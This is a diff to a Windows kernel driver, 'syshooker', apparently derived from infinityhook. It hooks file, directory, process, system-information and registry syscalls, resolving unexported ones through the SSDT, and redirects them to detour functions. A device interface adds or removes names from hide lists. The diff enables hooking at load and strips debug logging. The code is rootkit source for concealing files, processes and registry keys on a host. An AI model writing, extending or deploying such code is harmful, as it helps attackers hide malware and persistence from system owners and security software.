@@ -99,12 +99,8 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	//
 	// Figure out when we built this last for debugging purposes.
 	//
-	kprintf("[+] infinityhook: Loaded.\n");
+	kprintf("[+] syshooker: Loaded.\n");
 	
-	//
-	// Let the driver be unloaded gracefully. This also turns off 
-	// infinity hook.
-	//
 	DriverObject->DriverUnload = DriverUnload;
 
 	// HERE: find the address of a real syscall
@@ -112,7 +108,7 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	OriginalNtCreateFile = (NtCreateFile_t)MmGetSystemRoutineAddress(&StringNtCreateFile);
 	if (!OriginalNtCreateFile)
 	{
-		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtCreateFile);
+		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtCreateFile);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 
@@ -120,7 +116,7 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	/*OriginalNtWriteFile = (NtWriteFile_t)MmGetSystemRoutineAddress(&StringNtWriteFile);
 	if (!OriginalNtWriteFile)
 	{
-		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtWriteFile);
+		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtWriteFile);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}*/
 
@@ -128,7 +124,7 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	OriginalNtQueryDirectoryFile = (NtQueryDirectoryFile_t)MmGetSystemRoutineAddress(&StringNtQueryDirectoryFile);
 	if (!OriginalNtQueryDirectoryFile)
 	{
-		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFile);
+		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFile);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 
@@ -136,7 +132,7 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	OriginalNtQueryDirectoryFileEx = (NtQueryDirectoryFileEx_t)MmGetSystemRoutineAddress(&StringNtQueryDirectoryFileEx);
 	if (!OriginalNtQueryDirectoryFileEx)
 	{
-		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFileEx);
+		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFileEx);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 
@@ -144,76 +140,76 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	OriginalNtOpenProcess = (NtOpenProcess_t)MmGetSystemRoutineAddress(&StringNtOpenProcess);
 	if (!OriginalNtOpenProcess)
 	{
-		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtOpenProcess);
+		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtOpenProcess);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 
 	OriginalNtQuerySystemInformation = (NtQuerySystemInformation_t)MmGetSystemRoutineAddress(&StringNtQuerySystemInformation);
 	if (!OriginalNtQuerySystemInformation)
 	{
-		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQuerySystemInformation);
+		kprintf("[-] syshooker: Failed to locate export: %wZ.\n", StringNtQuerySystemInformation);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 
 
 	// for the syscalls that are not exported, we cannot use MmGetSystemRoutineAddress
-	// - we need to resolve their address from SSDT
+	// we need to resolve their address from SSDT
 
 	const void* SsdtAddress = GetSsdtAddress();
 	if (!SsdtAddress) {
-		kprintf("[-] infinityhook: SSDT pattern not found.\n");
+		kprintf("[-] syshooker: SSDT pattern not found.\n");
 	}
 	else {
-		kprintf("[+] infinityhook: SSDT address: %p\n", SsdtAddress);
+		kprintf("[+] syshooker: SSDT address: %p\n", SsdtAddress);
 	}
 
 	// NtOpenKey
 	OriginalNtOpenKey = (NtOpenKey_t)GetSyscallAddress(INDEX_NTOPENKEY, (PCHAR)SsdtAddress);
 	if (!OriginalNtOpenKey) {
-		kprintf("[-] infinityhook: Failed to locate the address of: %wZ.\n", StringNtOpenKey);
+		kprintf("[-] syshooker: Failed to locate the address of: %wZ.\n", StringNtOpenKey);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
-	else kprintf("[+] infinityhook: NtOpenKey address: %p.\n", OriginalNtOpenKey);
+	else kprintf("[+] syshooker: NtOpenKey address: %p.\n", OriginalNtOpenKey);
 
 	// NtQueryKey
 	OriginalNtQueryKey = (NtQueryKey_t)GetSyscallAddress(INDEX_NTQUERYKEY, (PCHAR)SsdtAddress);
 	if (!OriginalNtQueryKey) {
-		kprintf("[-] infinityhook: Failed to locate the address of: %wZ.\n", StringNtQueryKey);
+		kprintf("[-] syshooker: Failed to locate the address of: %wZ.\n", StringNtQueryKey);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
-	else kprintf("[+] infinityhook: NtQueryKey address: %p.\n", OriginalNtQueryKey);
+	else kprintf("[+] syshooker: NtQueryKey address: %p.\n", OriginalNtQueryKey);
 
 	// NtEnumerateKey
 	OriginalNtEnumerateKey = (NtEnumerateKey_t)GetSyscallAddress(INDEX_NTENUMERATEKEY, (PCHAR)SsdtAddress);
 	if (!OriginalNtEnumerateKey) {
-		kprintf("[-] infinityhook: Failed to locate the address of: %wZ.\n", StringNtEnumerateKey);
+		kprintf("[-] syshooker: Failed to locate the address of: %wZ.\n", StringNtEnumerateKey);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
-	else kprintf("[+] infinityhook: NtEnumerateKey address: %p.\n", OriginalNtEnumerateKey);
+	else kprintf("[+] syshooker: NtEnumerateKey address: %p.\n", OriginalNtEnumerateKey);
 
 	// NtOpenKeyEx
 	OriginalNtOpenKeyEx = (NtOpenKeyEx_t)GetSyscallAddress(INDEX_NTOPENKEYEX, (PCHAR)SsdtAddress);
 	if (!OriginalNtOpenKeyEx) {
-		kprintf("[-] infinityhook: Failed to locate the address of: %wZ.\n", StringNtOpenKeyEx);
+		kprintf("[-] syshooker: Failed to locate the address of: %wZ.\n", StringNtOpenKeyEx);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
-	else kprintf("[+] infinityhook: NtOpenKeyEx address: %p.\n", OriginalNtOpenKeyEx);
+	else kprintf("[+] syshooker: NtOpenKeyEx address: %p.\n", OriginalNtOpenKeyEx);
 
 	// Try to find addresses of the registry-related syscalls
 	// const void* NtOpenKeyAddr = GetSyscallAddress(INDEX_NTOPENKEY, (PCHAR)SsdtAddress);
-	// kprintf("[+] infinityhook: NtOpenKey address: %p\n", NtOpenKeyAddr);
+	// kprintf("[+] syshooker: NtOpenKey address: %p\n", NtOpenKeyAddr);
 
 	/*const void* NtOpenKeyExAddr = GetSyscallAddress(INDEX_NTOPENKEYEX, (PCHAR)SsdtAddress);
-	kprintf("[+] infinityhook: NtOpenKeyEx address: %p\n", NtOpenKeyExAddr);
+	kprintf("[+] syshooker: NtOpenKeyEx address: %p\n", NtOpenKeyExAddr);
 
 	const void* NtQueryKeyAddr = GetSyscallAddress(INDEX_NTQUERYKEY, (PCHAR)SsdtAddress);
-	kprintf("[+] infinityhook: NtQueryKey address: %p\n", NtQueryKeyAddr);
+	kprintf("[+] syshooker: NtQueryKey address: %p\n", NtQueryKeyAddr);
 
 	const void* NtQueryValueKeyAddr = GetSyscallAddress(INDEX_NTQUERYVALUEKEY, (PCHAR)SsdtAddress);
-	kprintf("[+] infinityhook: NtQueryValueKey address: %p\n", NtQueryValueKeyAddr);
+	kprintf("[+] syshooker: NtQueryValueKey address: %p\n", NtQueryValueKeyAddr);
 
 	const void* NtQueryMultipleValueKeyAddr = GetSyscallAddress(INDEX_NTQUERYMULTIPLEVALUEKEY, (PCHAR)SsdtAddress);
-	kprintf("[+] infinityhook: NtQueryMultipleValueKey address: %p\n", NtQueryMultipleValueKeyAddr);*/
+	kprintf("[+] syshooker: NtQueryMultipleValueKey address: %p\n", NtQueryMultipleValueKeyAddr);*/
 
 	//
 	// Initialize infinity hook. Each system call will be redirected
@@ -222,11 +218,11 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	NTSTATUS Status = IfhInitialize(SyscallCallback);
 	if (!NT_SUCCESS(Status))
 	{
-		kprintf("[-] infinityhook: Failed to initialize with status: 0x%lx.\n", Status);
+		kprintf("[-] syshooker: Failed to initialize with status: 0x%lx.\n", Status);
 	}
 	else
 	{
-		CALLBACK_OVERWRITE_ENABLED = 1; // TODO - uncomment here to start hooking
+		CALLBACK_OVERWRITE_ENABLED = 1;
 	}
 	
 	return Status;
@@ -236,56 +232,35 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 *	Turns off infinity hook.
 */
 void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
-	kprintf("[!] infinityhook: Unload invoked...\n");
 	UNREFERENCED_PARAMETER(DriverObject);
 
 	CALLBACK_OVERWRITE_ENABLED = 0;
 
-	//
 	// Unload infinity hook gracefully.
-	//
 	IfhRelease();
 
-	kprintf("[!] infinityhook: Unload - after IfhRelease...\n");
 
 	// Release driver resources (symlink, device object)
 	IoDeleteSymbolicLink(&symLink);
-	kprintf("[!] infinityhook: Unload - after delete symbolic...\n");
 	IoDeleteDevice(DriverObject->DeviceObject);
-
-	kprintf("\n[!] infinityhook: Unloading... BYE!\n");
 }
 
-/*
-*	For each usermode syscall, this stub will be invoked.
-*/
+// this function will be called for each syscall invoked from user-space
 void __fastcall SyscallCallback(
 	_In_ unsigned int SystemCallIndex, 
 	_Inout_ void** SystemCallFunction)
 {
-	// 
-	// Enabling this message gives you VERY verbose logging... and slows
-	// down the system. Use it only for debugging.
-	//
-	
-#if 0
-	kprintf("[+] infinityhook: SYSCALL %lu: 0x%p [stack: 0x%p].\n", SystemCallIndex, *SystemCallFunction, SystemCallFunction);
-#endif
-
 	UNREFERENCED_PARAMETER(SystemCallIndex);
 
-	if (!CALLBACK_OVERWRITE_ENABLED) return;
+	if (!CALLBACK_OVERWRITE_ENABLED) return; // if overwrite is not enabled, do not check any addresses - just quit
 
-	// HERE: overwrite the syscall address
-	//
-	// In our demo, we care only about nt!NtCreateFile calls.
-	//
+	// overwrite the syscall address
+	// if the SystemCallFunction on the stack equals any of the addresses that we hook,
+	// overwrite the address with the corresponding detour function
+
+	// NtCreateFile
 	if (*SystemCallFunction == OriginalNtCreateFile)
 	{	
-		//
-		// We can overwrite the return address on the stack to our detoured
-		// NtCreateFile.
-		//
 		*SystemCallFunction = DetourNtCreateFile;
 	}
 
@@ -383,30 +358,30 @@ NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 		if (request->Operation == OPERATION_ADD) {
 			NameNode* NewNameNode = CreateNameNode(request->NameBuffer, request->NameLength);
 			if (NewNameNode == nullptr) {
-				kprintf("[-] syshooker IRQ_WRITE: Failed to allocate newNameNode.\n");
+				kprintf("[-] syshooker: IRQ_WRITE: Failed to allocate newNameNode.\n");
 				status = STATUS_INVALID_PARAMETER;
 				break;
 			}
 
-			kprintf("[+] syshooker IRQ_WRITE: newNameNode: %ws.\n", NewNameNode->NameBuffer);
+			//kprintf("[+] syshooker: IRQ_WRITE: newNameNode: %ws.\n", NewNameNode->NameBuffer);
 
 			status = appendNameNode(request->Target, NewNameNode);
 			if (!NT_SUCCESS(status)) {
 				if (status == STATUS_DUPLICATE_NAME)
-					kprintf("[-] syshooker IRQ_WRITE: not adding duplicate.\n");
+					kprintf("[+] syshooker: IRQ_WRITE: not adding duplicate.\n");
 				else
-					kprintf("[-] syshooker IRQ_WRITE: Failed to append newNameNode.\n");
+					kprintf("[-] syshooker: IRQ_WRITE: Failed to append newNameNode.\n");
 
 				FreeNameNode(NewNameNode);
 				break;
 			}
 			else {
-				kprintf("[+] syshooker IRQ_WRITE: newNameNode appended successfully.\n");
+				kprintf("[+] syshooker: IRQ_WRITE: newNameNode appended successfully.\n");
 			}
 		}
 		else if (request->Operation == OPERATION_REMOVE) {
 			if (request->NameLength <= 0) {
-				kprintf("[-] syshooker IRQ_WRITE: remove operation, NameLength 0.\n");
+				kprintf("[-] syshooker: IRQ_WRITE: remove operation, invalid NameLength (0).\n");
 				status = STATUS_INVALID_PARAMETER;
 				break;
 			}
@@ -415,7 +390,7 @@ NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 		}
 		else if (request->Operation == OPERATION_TOGGLE) {
 			CALLBACK_OVERWRITE_ENABLED = CALLBACK_OVERWRITE_ENABLED == 1 ? 0 : 1;
-			kprintf("[+] syshooker IRQ_WRITE: Toggle. Overwrite Status is now: %d\n", CALLBACK_OVERWRITE_ENABLED);
+			kprintf("[+] syshooker: IRQ_WRITE: Toggle. Overwrite Status is now: %d\n", CALLBACK_OVERWRITE_ENABLED);
 		}
 		else {
 			status = STATUS_INVALID_PARAMETER;
@@ -435,7 +410,6 @@ NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 }
 
 NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
-	kprintf("[+] syshooker IRQ_READ called\n");
 	UNREFERENCED_PARAMETER(DeviceObject);
 	NTSTATUS status = STATUS_SUCCESS; // initially define status as success
 
@@ -458,7 +432,7 @@ NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 
 		// check nullptr
 		if (data == nullptr) {
-			kprintf("[-] syshooker IRQ_READ: Data cannot be nullptr.\n");
+			kprintf("[-] syshooker: IRQ_READ: Data cannot be nullptr.\n");
 
 			status = STATUS_INVALID_PARAMETER;
 			break;
